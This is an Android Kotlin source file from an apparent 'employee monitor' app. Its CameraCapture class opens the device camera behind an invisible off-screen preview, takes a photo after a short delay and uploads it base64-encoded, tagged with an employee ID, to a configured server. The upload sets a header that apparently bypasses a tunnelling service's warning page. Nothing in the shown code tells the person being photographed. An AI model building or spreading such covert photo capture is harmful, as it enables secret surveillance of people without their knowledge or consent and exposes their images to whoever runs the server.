package com.employeemonitor

import android.content.Context
import android.graphics.ImageFormat
import android.graphics.SurfaceTexture
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.util.Log
import android.view.Surface
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

class CameraCapture(private val context: Context) {

    companion object {
        private const val TAG = "CameraCapture"
    }

    private val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
    private val client = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .addInterceptor { chain ->
            val req = chain.request().newBuilder().header("bypass-tunnel-reminder", "true").build()
            chain.proceed(req)
        }
        .build()

    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var bgThread: HandlerThread? = null
    private var bgHandler: Handler? = null
    private var previewSurface: Surface? = null
    private var previewTexture: SurfaceTexture? = null
    private var imageReader: ImageReader? = null
    private var callback: ((Boolean, String) -> Unit)? = null
    private val mainHandler = Handler(android.os.Looper.getMainLooper())
    private val captured = AtomicBoolean(false)

    fun capturePhoto(callback: (Boolean, String) -> Unit) {
        this.callback = callback
        captured.set(false)
        try {
            startBackground()

            val cameraId = getBackCamera() ?: getFrontCamera()
            if (cameraId == null) {
                stopBackground()
                mainHandler.post { callback(false, "No camera found") }
                return
            }

            previewTexture = SurfaceTexture(10).apply {
                setDefaultBufferSize(640, 480)
            }
            previewSurface = Surface(previewTexture!!)

            imageReader = ImageReader.newInstance(1280, 960, ImageFormat.JPEG, 2)

            // *** KEY FIX: Set OnImageAvailableListener BEFORE opening camera ***
            imageReader!!.setOnImageAvailableListener({ reader ->
                Log.d(TAG, ">>> OnImageAvailableListener fired!")
                val image = reader?.acquireLatestImage()
                if (image != null) {
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    image.close()
                    Log.d(TAG, "Image read: ${bytes.size} bytes")
                    closeCamera()
                    sendPhoto(bytes)
                } else {
                    Log.e(TAG, "OnImageAvailable but image is null")
                    closeCamera()
                    mainHandler.post { callback?.invoke(false, "Image available but null") }
                }
            }, bgHandler)

            Log.d(TAG, "Opening camera: $cameraId")
            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    Log.d(TAG, "Camera opened")
                    cameraDevice = camera
                    try {
                        camera.createCaptureSession(
                            listOf(previewSurface!!, imageReader!!.surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    Log.d(TAG, "Capture session configured")
                                    captureSession = session
                                    try {
                                        // Start preview so camera produces frames
                                        val previewRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                                        previewRequest.addTarget(previewSurface!!)
                                        previewRequest.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                        previewRequest.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                        session.setRepeatingRequest(previewRequest.build(), null, bgHandler)

                                        // Wait 1.5s for camera to warm up, then take photo
                                        bgHandler?.postDelayed({
                                            if (captured.compareAndSet(false, true)) {
                                                try {
                                                    Log.d(TAG, "Taking photo...")
                                                    val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                                    captureRequest.addTarget(imageReader!!.surface)
                                                    captureRequest.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                                    captureRequest.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                                    session.capture(captureRequest.build(), null, bgHandler)
                                                    Log.d(TAG, "Capture request sent")
                                                } catch (e: Exception) {
                                                    Log.e(TAG, "Capture request failed", e)
                                                    closeCamera()
                                                    mainHandler.post { callback(false, "Capture error: ${e.message}") }
                                                }
                                            }
                                        }, 1500)
                                    } catch (e: Exception) {
                                        Log.e(TAG, "Session error", e)
                                        closeCamera()
                                        mainHandler.post { callback(false, "Session error: ${e.message}") }
                                    }
                                }

                                override fun onConfigureFailed(session: CameraCaptureSession) {
                                    Log.e(TAG, "Camera config failed")
                                    closeCamera()
                                    mainHandler.post { callback(false, "Camera config failed") }
                                }
                            },
                            bgHandler
                        )
                    } catch (e: Exception) {
                        Log.e(TAG, "Session create error", e)
                        closeCamera()
                        mainHandler.post { callback(false, "Session create error: ${e.message}") }
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    Log.w(TAG, "Camera disconnected")
                    closeCamera()
                }
                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e(TAG, "Camera error: $error")
                    closeCamera()
                    mainHandler.post { callback(false, "Camera error: $error") }
                }
            }, bgHandler)
        } catch (e: SecurityException) {
            Log.e(TAG, "Camera permission not granted", e)
            stopBackground()
            mainHandler.post { callback(false, "Camera permission not granted") }
        } catch (e: Exception) {
            Log.e(TAG, "Error", e)
            stopBackground()
            mainHandler.post { callback(false, "Error: ${e.message}") }
        }
    }

    private fun sendPhoto(jpegBytes: ByteArray) {
        val serverUrl = DeviceConfig.getServerUrl(context)
        val empId = DeviceConfig.getEmployeeId(context)
        if (serverUrl.isEmpty() || empId.isEmpty()) {
            mainHandler.post { callback?.invoke(false, "Not configured") }
            return
        }

        val base64 = Base64.encodeToString(jpegBytes, Base64.NO_WRAP)
        val sizeKb = jpegBytes.size / 1024
        Log.d(TAG, "Uploading photo: ${sizeKb}KB")

        val json = """{"employee_id":"$empId","timestamp":${System.currentTimeMillis()},"image_base64":"$base64","app_package":"camera_capture","width":1280,"height":960}"""
        val body = json.toRequestBody("application/json".toMediaType())
        val request = Request.Builder().url("$serverUrl/api/screenshot/upload").post(body).build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {
                Log.e(TAG, "Upload failed: ${e.message}")
                mainHandler.post { callback?.invoke(false, "Upload failed: ${e.message}") }
            }
            override fun onResponse(call: Call, response: Response) {
                val success = response.isSuccessful
                Log.d(TAG, "Upload result: ${response.code}")
                response.close()
                mainHandler.post { callback?.invoke(success, if (success) "Photo captured (${sizeKb}KB)" else "Upload error: ${response.code}") }
            }
        })
    }

    fun close() {
        closeCamera()
    }

    private fun closeCamera() {
        try {
            captureSession?.close()
            captureSession = null
            cameraDevice?.close()
            cameraDevice = null
            imageReader?.close()
            imageReader = null
            previewSurface?.release()
            previewSurface = null
            previewTexture?.release()
            previewTexture = null
        } catch (e: Exception) {
            Log.e(TAG, "Close error", e)
        }
        stopBackground()
    }

    private fun getBackCamera(): String? = try {
        cameraManager.cameraIdList.firstOrNull {
            cameraManager.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
        }
    } catch (e: Exception) { null }

    private fun getFrontCamera(): String? = try {
        cameraManager.cameraIdList.firstOrNull {
            cameraManager.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
        }
    } catch (e: Exception) { null }

    private fun startBackground() {
        bgThread = HandlerThread("CamBG").also { it.start() }
        bgHandler = Handler(bgThread!!.looper)
    }

    private fun stopBackground() {
        bgThread?.quitSafely()
        try { bgThread?.join(2000) } catch (_: Exception) {}
        bgThread = null
        bgHandler = null
    }
}
